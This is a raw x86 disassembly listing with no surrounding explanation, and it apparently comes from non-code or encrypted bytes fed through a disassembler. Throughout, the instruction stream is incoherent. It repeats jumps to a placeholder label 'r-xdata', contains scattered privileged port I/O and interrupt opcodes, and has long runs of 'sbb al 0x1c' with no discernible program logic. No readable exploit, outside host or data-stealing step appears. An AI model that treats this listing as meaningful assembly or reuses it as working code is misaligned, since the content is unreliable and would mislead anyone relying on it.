xor ebx [ esi ]
cmpsb [ esi ] [ edi ]
sbb esi [ ebx + 0x1c1d050a ]
sbb al 0x73
jae r-xdata
mov [ eax + 0x1c2b140a ] edx
sbb al 0x73
jae r-xdata
or al [ ecx ]
jae r-xdata
push 0x2f730a1b
sbb edx eax
and eax [ ebp - 0x74e65996 ]
out 0xe2 eax
jecxz r-xdata
push 0xffffffa6
sbb al 0x74
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
inc ebx
mov bl 0x68
and eax 0x1c31340a
sbb al 0x73
mov dl 0xb0
mov ch 0xa
inc ebx
or ebx [ esp + ebx ]
push 0x223a0b25
sbb al 0x1c
mov edx 0x66ec2366
sub [ es : esp + ebx ] bl
sbb al 0xa
jae r-xdata
mov esp edi
loop r-xdata
jecxz r-xdata
push 0x202aeba6
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
and al 0xa
jae r-xdata
xchg ebp eax
jae r-xdata
mov al 0xb5
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
sbb al 0x95
arpl bx sp
jae r-xdata
sbb al 0xb3
push 0xb31ceba6
sbb [ si ] bl
jae r-xdata
jae r-xdata
jae r-xdata
shl [ edx + ebp * 2 + 0x390adba5 ] 0x2c
sbb al 0x1c
jecxz r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
and [ esp + ebx ] ebp
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
jae r-xdata
or bh [ esi + 0x731c1c5f ]
xchg edi eax
pop dx
sub al 0x1c
sbb al 0xa
sbb al 0xa
xchg [ edi ] esi
sbb al 0x1c
in al dx
push 0xec156613
jecxz r-xdata
jae r-xdata
sbb [ ebx - 0x1c1c1d19 ] ecx
push 0xffffffa6
sbb al 0x93
push 0xe8e30a24
jae r-xdata
adc [ ebx + 0x140a9089 ] edi
sub ebx [ esp + ebx ]
sbb al 0x73
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
inc ebx
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
xor eax 0x1c1d6a0a
sbb al 0x73
jae r-xdata
jae r-xdata
pushfd
aas
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
0x681c1c5e 0xf3a6
adc esp [ esi + 0x15 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
sbb eax edx
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
jae r-xdata
sub ah [ esi + 0x23 ]
in al dx
jae r-xdata
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sub al 0x1c
jae r-xdata
or [ esp + ebx ] ebx
int1
jae r-xdata
int3
jae r-xdata
or ecx ecx
jae r-xdata
sbb al 0x1c
leave
jae r-xdata
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
or esi ecx
jecxz r-xdata
and eax [ ebp + 0x6e1fa66a ]
mov bl 0x1c
xchg esi eax
outsb
call 0x73ba3808
jae r-xdata
out 0x68 eax
jae r-xdata
mov bl 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa5
mov dh 0xa
mov ah 0x39
outsb
pushad
sahf
out dx eax
jecxz r-xdata
iretd
outsb
mov dh 0x17
or ebp ecx
or [ esp + ebx ] ebx
or bl [ esi + eax ]
sbb al 0x1c
mov al 0xb5
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl ah
sbb al 0x1c
jae r-xdata
or cl ah
jecxz r-xdata
movsb [ edi ] [ esi ]
mov al [ 0xffffffffec2366f3 ]
sbb eax 0x68e3e3eb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx + ebp ]
sbb al 0x1c
sbb ecx [ edx ]
jae r-xdata
test [ eax ] bh
sbb al 0xb3
jae r-xdata
jae r-xdata
aas
sbb al 0x96
jae r-xdata
mov esi 0x731c1c5f
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
mov [ bp + di - 0x1f ] 0xab0ae3e3
adc ebx [ esp + ebx ]
mov cl [ edx ]
je r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
lea eax [ ebp - 0x44f65996 ]
mov [ edi + 0xfa66a85 ] edx
mov ebx 0x760a8a89
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btr [ edx + ebp * 2 + 0x120b0fbe ] esi
adc [ esp + ebx ] ebx
pushad
daa
out dx eax
and bp sp
out 0x29 eax
sbb al 0x1c
push 0x6ab3b3a5
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
in eax dx
jmp 0x68fd37b9
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x68
mov dh 0xef
sbb ecx [ ebx - 0x1c1c1d19 ]
or bl [ edi + edi + 0x73731c1c ]
jae r-xdata
jae r-xdata
mov [ ebp + 0x9a66a85 ] ecx
mov ebx 0x6a859789
jae r-xdata
loop r-xdata
jae r-xdata
xchg ecx eax
pop ebx
and al 0xa6
in al dx
mov [ 0x1c24 ] al
jae r-xdata
sbb al 0x66
and ecx [ edx ]
0x731c1c02 0x8a89
sbb al 0x1c
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
adc ecx [ edx ]
or [ esp + ebx ] ah
or [ bp + di ] esi
sbb al 0x1c
mov bl 0xa
add dh [ ebx ]
sbb al 0x1c
jae r-xdata
push 0x2366f3a0
in al dx
mov ebp 0x89202ab8
mov al [ ebp - 0x44f25996 ]
mov ebx eax
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
pushad
lahf
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btc [ ecx + 0x3a760a8a ] ecx
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x97
jae r-xdata
and ebp esp
mov ebx esp
mov bl 0xa
fnstenv [ ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov esp 0x2366b8bd
in al dx
xchg ebp eax
sub bl [ esp + ebx ]
xchg ecx eax
xchg ebp eax
retn
and bp sp
sbb al 0x73
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
and al 0x1c
imul esp
jmp r-xdata
jae r-xdata
mov dh 0xe9
jae r-xdata
jae r-xdata
mul edx
jae r-xdata
jae r-xdata
jecxz r-xdata
adc edi [ ebx - 0x6ff53977 ]
jecxz r-xdata
sub ah [ eax ]
jae r-xdata
aas
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0xf3
outsb
nop [ esp + ebx ] bx
or edi ecx
or [ esp + ebx ] ebx
push 0xf10befb6
shl [ ebx ] 0x1
jae r-xdata
mov dh 0x68
jae r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
mov edx 0x6a858d89
scasb [ edi ]
or eax 0x1c0d2c0a
sbb al 0x68
cmp ecx [ ebx - 0x69ef9a79 ]
mov ah 0x6a
mov ebp 0xa8d0bab
sbb al 0x1c
std
punpcklbw mmx0 [ edi ]
sbb esp [ edx + 0xf ]
adc edi [ ebx - 0x33f56c77 ]
test [ edx - 0x5a ] ebp
jae r-xdata
or [ ebx + 0x6a859789 ] edi
cmpsb [ esi ] [ edi ]
or edi [ ecx ]
and bl [ esp + ebx ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
popad
and [ ebx ] ah
shl [ ebx ] 0x1
mov esp 0x7373202a
push 0xe21c601a
in al dx
or ax 0x1c1c
ficomp [ esi - 0x21991309 ]
or [ esp + ebx ] ebx
or ch [ edi + 0x731c1c16 ]
jae r-xdata
jae r-xdata
or edi [ edi + 0x601c1c2f ]
daa
out dx eax
mov ebp ebx
loope r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
in al dx
jne r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx + 0x740a8a89 ] edi
pop ss
push 0xffffffa6
jae r-xdata
mov [ edx + 0xda66a85 ] ecx
mov ebx 0x6a85c389
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
push ss
outsb
jae r-xdata
jae r-xdata
mov [ 0x1c01360a ] eax
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
pop ds
and eax 0xab41c1c
adc [ edx ] dh
sbb al 0x1c
in al dx
and [ edx ] cl
xchg esi eax
sbb al 0x1c
jae r-xdata
jae r-xdata
insd
push ds
sbb al 0x1c
or dl [ esi + 0x731c1c33 ]
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or ah [ ecx + 0x731c1c0b ]
jecxz r-xdata
outsb
scasb [ edi ]
cmp ebp [ esi - 0x5a ]
dec ebx
or edi [ edx + 0xae3e3e1 ]
jo r-xdata
das
mov ebx [ edx - 0x59db796d ]
xor edx [ ecx + 0xbc3c395 ]
mov ecx fs
cmpsb [ esi ] [ edi ]
sub edx [ ebx + 0x24c38f91 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
mov bh 0xb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ edx + edx + 0x73731c1c ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jne r-xdata
outsb
jecxz r-xdata
mov esp 0x202ab8bd
cmpsb [ esi ] [ edi ]
push 0xffffff9e
or eax 0x6a853568
mov dh 0xd9
push 0x9e6a851b
adc ebp [ eax + 0x33 ]
test [ edx - 0x4a ] ebp
fild [ eax + 0x1a ]
push 0x9e6a8532
adc [ ebp + 0x68ddb66a ] eax
sbb ebp [ eax + 0x33 ]
test [ edx - 0x42 ] ebp
add [ edx ] ecx
pop es
pop ebp
sbb al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
or ah [ edx ]
out dx al
jecxz r-xdata
cmp [ edx ] esp
sbb al 0x1c
loop r-xdata
jae r-xdata
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffbe
pop ds
mov esi 0xe7b51c1f
jae r-xdata
sti
jecxz r-xdata
jne r-xdata
jae r-xdata
and eax 0x1c1e6d0b
sbb al 0xa
xchg esi eax
xor ebx [ esp + ebx ]
jae r-xdata
or cl [ edi + ebp + 0x1c ]
sbb al 0x73
mov ebx 0xcc0a9389
sbb al 0x1c
or dh [ esi + 0x3a ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb0
movsb [ edi ] [ esi ]
sbb al 0x75
dec edi
jecxz r-xdata
or bh [ ebp - 0x7ae3e3d3 ]
jae r-xdata
mov edx 0x67ec2366
jmp 0xffffffffd12a3b3e
jae r-xdata
in al dx
sbb eax 0x8561ecc3
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or dl ch
adc [ esp + ebx ] bl
adc bl [ esp + ebx ]
jae r-xdata
jae r-xdata
mov esi eax
or dl [ eax + 0x73e3e3e3 ]
sbb al 0x73
mov [ edx + 0x11a66a85 ] ecx
mov ebx 0x1c3f160a
jmp r-xdata
jbe r-xdata
sbb al 0xec
jae r-xdata
or eax 0x85c389bb
push 0xffffffa6
cmpsb [ esi ] [ edi ]
mov [ ecx - 0x59957a45 ] eax
sbb ecx [ ecx + 0x6a85bb90 ]
cmp bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or al [ edi - 0x13e3e3c9 ]
outsb
mov ah 0xb0
or cl [ edx + edx + 0x73731c1c ]
sbb al 0xa
daa
out 0xe3 eax
sub al 0x1c
sbb al 0x1c
jae r-xdata
sbb al 0xb5
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
sbb al 0x96
outsb
cmpsb [ esi ] [ edi ]
aas
mov bl 0x68
and eax 0x1c58070b
sbb al 0xba
and bp sp
jae r-xdata
jae r-xdata
mov dl 0xa
aad 0x10
sbb al 0x1c
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0x1c
sub eax 0x6a851c1c
mov esi 0xb88e891d
jae r-xdata
jmp 0xffffffffd12a3b3e
and ebp esp
jae r-xdata
jecxz r-xdata
sar [ ebx + 0x2b689b89 ] 0x85
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
or dl [ esi ]
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0x1c
sbb ax 0xe3eb
or ah [ ecx ]
mov [ edx + ebp * 2 ] ebx
sahf
sbb ebx [ esi * 2 - 0x1c1c1c91 ]
and cx [ edx ]
mov ecx 0x731c1c08
jae r-xdata
mov ebp edi
jecxz r-xdata
ja r-xdata
push 0x1b07600f
bound ecx [ edi ]
jae r-xdata
jae r-xdata
daa
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
iretd
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xffffffbe
sbb eax 0xab88e89
push es
sbb al 0x85
jae r-xdata
sub ah [ eax ]
sbb al 0x1c
mov esp 0x737320bd
jae r-xdata
insb
sub ebx [ esp + ebx ]
mov [ ebx + 0x6a852b68 ] ebx
scasb [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
aas
mov ebx 0x1c0ba10a
cmpsb [ esi ] [ edi ]
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffa6
jae r-xdata
pushad
daa
out dx eax
fidivr [ edi + 0x67ecf7c7 ]
jmp r-xdata
jae r-xdata
jae r-xdata
popad
sbb al 0x1c
dec ebx
mov ch 0xa
pop esp
sub [ esp + ebx ] ebx
test [ edx - 0x52 ] ebp
jae r-xdata
sahf
sbb ebx [ esi * 4 + 0x603b68db ]
sbb [ esp + ebp * 8 ] bl
jecxz r-xdata
push 0xa66a8525
jae r-xdata
push 0xbc0aeba6
push 0xae6a852b
jae r-xdata
mov ebx 0x2b689b89
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
pushad
sbb eax 0xab681c1c
jmp r-xdata
fsubr st6
test [ edx - 0x5a ] ebp
test [ edx - 0x52 ] ebp
jae r-xdata
fwait
jae r-xdata
and eax 0xc1a66a85
jae r-xdata
pushad
jae r-xdata
or [ si ] bl
sbb al 0x1c
pushad
sahf
pop ds
out 0xec eax
outsd
add bl [ esp + ebx ]
sbb al 0xa
xlat
or al 0x1c
sbb al 0xa
jno r-xdata
cmp esp [ eax + 0x18 ]
sbb al 0xec
pushad
sbb dl cl
in al dx
sub al 0x1d
sbb al 0x1c
push 0x2468ebab
or esi [ edi + 0xa1c1c25 ]
mov ch 0x4
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
loop r-xdata
sub eax [ ebp - 0x45385196 ]
mov [ ecx + 0x6a853a68 ] edx
mov esi 0x853b68c5
push 0xffffffbe
jae r-xdata
mov bl 0xec
jae r-xdata
jae r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
sbb al 0x73
jecxz r-xdata
push 0xffffffae
mov edx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
mov eax 0x1c06670a
or ah [ edi + 0x6 ]
jmp r-xdata
arpl [ esi + edx * 4 ] bx
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x1c
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
retn
jae r-xdata
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
mov ah 0xaf
jae r-xdata
jae r-xdata

push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp
and bp sp
sbb al 0xb4
scasd [ edi ]
jae r-xdata
nop
and al 0xa6
jae r-xdata
0x1c13
in al dx
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
and [ ebp - 0x44025996 ] eax
mov ebp ecx
mov ebp 0x6a858689
rol ebx 0xc1
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
jae r-xdata
jae r-xdata
mov edx 0xece11b60
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
push 0xffffffb6
aas
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
mov ebp 0x1c29ec0a
sbb al 0x73
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x1c
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
jecxz r-xdata
jae r-xdata
ja r-xdata
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov bh 0xb
jae r-xdata
sbb al 0x73
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
cdq
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
in al dx
push esp
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
loop r-xdata
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jmp 0xffffffffe3db145e
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
loop r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0xb0
or cl dh
lahf
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
btr [ edx ] ecx
jae r-xdata
push 0xb30f620f
loope r-xdata
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
iretd
jae r-xdata
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
sbb al 0x1c
fistp [ ebx ]
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
